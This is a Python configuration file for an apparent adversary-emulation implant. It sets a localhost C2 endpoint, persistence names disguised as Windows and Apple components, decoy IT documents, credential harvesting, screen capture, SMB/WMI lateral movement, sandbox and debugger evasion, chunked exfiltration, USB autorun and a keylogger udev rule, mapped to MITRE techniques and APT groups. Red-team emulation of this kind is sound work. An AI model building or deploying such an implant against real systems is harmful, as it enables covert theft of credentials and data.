# Configuration file for the APT emulation system
# All configuration constants are centralized here

# Operational Security Settings
SILENT_MODE = True
DEBUG_MODE = False
PROCESS_NAME_MASQUERADE = "svchost.exe"
HIDE_CONSOLE = True

# C2 Server Configuration
C2_SERVER = 'http://localhost:3000/api/agent'
AGENT_API_KEY = 'development-agent-key-change-in-production'
TRANSMISSION_INTERVAL = 900  # 15 minutes in seconds
C2_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
C2_TIMEOUT = 30
C2_MAX_RETRIES = 3

# File Paths
LOG_FILE = 'system_logs.json'
PAYLOAD_SCRIPT = 'payload.py'
PERSISTENCE_KEY_NAME = "WindowsSecurityUpdate"
SCHEDULED_TASK_NAME = "SystemMaintenanceTask"
REPORT_DIR = 'reports'
PLUGIN_DIR = 'plugins'

# Stealth Settings
JITTER_MIN = 1
JITTER_MAX = 5
RETRY_DELAY_MIN = 5
RETRY_DELAY_MAX = 15

# Believable files to create as decoys
BELIEVABLE_FILES = {
    'HelpDesk_Password_Reset_Procedure.pdf': 'PDF content for password reset procedures',
    'VPN_Config_2026.mobileconfig': 'Mobile configuration profile for VPN access',
    'WiFiSSO_Upgrade_Instructions.docx': 'WiFi Single Sign-On upgrade documentation',
    'IT-Asset-Register.xlsx': 'IT asset inventory and management spreadsheet'
}

# Credential Harvesting Settings
CREDENTIAL_HARVEST_ENABLED = True
HARVEST_BROWSER_CREDENTIALS = True
HARVEST_WIRELESS_CREDENTIALS = True
HARVEST_WINDOWS_VAULT = True
HARVEST_LSA_SECRETS = False  # Requires admin privileges

# Screen Capture Settings
SCREEN_CAPTURE_ENABLED = True
SCREEN_CAPTURE_INTERVAL = 30  # seconds
SCREEN_CAPTURE_QUALITY = 70  # JPEG quality (1-100)
SCREEN_STREAM_ENABLED = False
SCREEN_STREAM_MAX_FRAMES = 100

# Lateral Movement Settings
LATERAL_MOVEMENT_ENABLED = True
NETWORK_DISCOVERY_ENABLED = True
SMB_MOVEMENT_ENABLED = True
WMI_MOVEMENT_ENABLED = True
PSEXEC_MOVEMENT_ENABLED = False  # Requires external tool

# Evasion Settings
EVASION_ENABLED = True
SANDBOX_DETECTION_ENABLED = True
VM_DETECTION_ENABLED = True
DEBUGGER_DETECTION_ENABLED = True
ANALYSIS_TOOL_DETECTION_ENABLED = True
USER_ACTIVITY_SIMULATION_ENABLED = False
EVASION_THREAD_COUNT = 2

# Plugin System Settings
PLUGIN_SYSTEM_ENABLED = True
AUTO_LOAD_PLUGINS = True
PLUGIN_HOOK_EVENTS = ['startup', 'shutdown', 'command', 'data_received']

# MITRE ATT&CK Settings
MITRE_LOGGING_ENABLED = True
MITRE_LOG_DIR = 'logs'
LOG_ALL_TECHNIQUES = False
TECHNIQUE_COVERAGE_TRACKING = True
APT_GROUP_MAPPING_ENABLED = True

# Reporting Settings
REPORTING_ENABLED = True
AUTO_GENERATE_REPORTS = False
REPORT_INTERVAL_HOURS = 24
REPORT_FORMAT = 'json'
EXECUTIVE_SUMMARY_ENABLED = True
TECHNICAL_DETAILS_ENABLED = True

# Campaign Settings
CAMPAIGN_MODE_ENABLED = False
CAMPAIGN_AUTO_EXECUTE = False
CAMPAIGN_STOP_ON_FAILURE = False
MAX_CAMPAIGN_PHASES = 10

# Exfiltration Settings
EXFIL_ENABLED = True
EXFIL_MAX_SIZE_MB = 100
EXFIL_CHUNK_SIZE = 1024 * 1024  # 1MB chunks
EXFIL_DELAY_BETWEEN_CHUNKS = 5

# MITRE ATT&CK Technique Mapping - Extended
MITRE_TECHNIQUES = {
    # Persistence
    'T1547.001': 'Boot or Logon Autostart Execution: Registry Run Keys',
    'T1053.005': 'Scheduled Task/Job: Scheduled Task',
    'T1543.003': 'Windows Service',
    
    # Privilege Escalation
    'T1055': 'Process Injection',
    'T1068': 'Exploitation for Privilege Escalation',
    
    # Defense Evasion
    'T1027': 'Obfuscated Files or Information',
    'T1070': 'Indicator Removal',
    'T1564': 'Hide Artifacts',
    'T1622': 'Debugger Evasion',
    
    # Credential Access
    'T1555': 'Credentials from Password Stores',
    'T1555.003': 'Windows Credential Manager',
    'T1003': 'OS Credential Dumping',
    'T1003.001': 'LSASS Memory',
    'T1056.001': 'Input Capture: Keylogging',
    
    # Discovery
    'T1082': 'System Information Discovery',
    'T1087.001': 'Local Account Discovery',
    'T1087.002': 'Domain Account Discovery',
    'T1057': 'Process Discovery',
    'T1018': 'Remote System Discovery',
    'T1016': 'System Network Configuration Discovery',
    'T1135': 'Network Share Discovery',
    
    # Lateral Movement
    'T1021.002': 'SMB/Windows Admin Shares',
    'T1021.001': 'Remote Desktop Protocol',
    'T1047': 'Windows Management Instrumentation',
    'T1091': 'Replication Through Removable Media',
    
    # Collection
    'T1113': 'Screen Capture',
    'T1005': 'Data from Local System',
    'T1039': 'Data from Network Shared Drive',
    
    # Command and Control
    'T1071.001': 'Application Layer Protocol: Web Protocols',
    'T1071.002': 'DNS',
    'T1132': 'Data Encoding',
    'T1001': 'Data Obfuscation',
    
    # Exfiltration
    'T1041': 'Exfiltration Over C2 Channel',
    'T1020': 'Automated Exfiltration',
    'T1567': 'Exfiltration Over Web Service',
    
    # Impact
    'T1486': 'Data Encrypted for Impact',
    'T1489': 'Service Stop',
}

# APT Group Profiles
APT_PROFILES = {
    'APT1': {
        'name': 'Comment Crew',
        'focus': 'Data collection and exfiltration',
        'techniques': ['T1082', 'T1056.001', 'T1041', 'T1547.001', 'T1005']
    },
    'APT28': {
        'name': 'Fancy Bear',
        'focus': 'Credential harvesting and lateral movement',
        'techniques': ['T1003.001', 'T1021.002', 'T1550.002', 'T1113', 'T1055']
    },
    'APT29': {
        'name': 'Cozy Bear',
        'focus': 'Stealth and living-off-the-land',
        'techniques': ['T1059.001', 'T1027', 'T1071.001', 'T1055', 'T1047']
    },
    'APT41': {
        'name': 'Barium',
        'focus': 'Multi-purpose espionage and financial gain',
        'techniques': ['T1021.001', 'T1082', 'T1055', 'T1003', 'T1113']
    }
}

# Auto-Execution Settings (USB Insertion)
AUTO_EXECUTION_ENABLED = True
USB_AUTO_RUN_ENABLED = True
USB_PAYLOAD_NAME = "Update.exe"
USB_AUTORUN_FILENAME = "Autorun.inf"
USB_DECOY_FILES_ENABLED = True
USB_HIDE_PAYLOAD = True
USB_ICON_PATH = ""
USB_VOLUME_LABEL = "USB Storage Device"

# macOS Auto-Execution Settings
MACOS_LAUNCH_AGENT_NAME = "com.apple.usb.agent"
MACOS_LAUNCH_DAEMON_NAME = "com.apple.usb.daemon"
MACOS_HIDE_LAUNCH_AGENT = True

# Linux Auto-Execution Settings
LINUX_UDEV_RULE_NAME = "99-usb-keylogger.rules"
LINUX_LAUNCHER_SCRIPT = "usb_launcher.sh"
LINUX_AUTOSTART_DESKTOP = "usb-autostart.desktop"

# Payload Generation Settings
PYINSTALLER_ONE_FILE = True
PYINSTALLER_WINDOWED = True
PYINSTALLER_COMPRESS = True
PYINSTALLER_UPX = True
